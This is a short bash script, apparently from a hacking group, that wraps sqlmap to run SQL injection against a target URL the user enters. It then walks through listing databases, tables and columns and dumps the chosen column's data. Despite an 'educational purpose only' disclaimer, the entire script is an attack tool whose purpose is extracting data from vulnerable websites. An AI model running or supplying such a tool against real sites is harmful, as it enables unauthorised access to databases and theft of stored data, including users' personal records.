#!/bin/bash
# sqlifc
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
#
#

# START

# Header 

echo "#####################################################"
echo "##                                                 ##"
echo "##           INDONESIAN FIGHTER CYBER              ##"
echo "##               _SQL INJECTION_                   ##"
echo "##            code by : SanSORiugan                ##"
echo "##              date : 1/05/2018                   ##"
echo "##    -ONE INTENTION-ONE SPIRIT-ONE COMMAND        ##"
echo "##                                                 ##"
echo "#####################################################"

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " done >>"
read TARGET
python sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " done >>"
read DATABASE
python sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " done >>"
read TABLE
python sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " done >>"
read COLUMN
python sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END
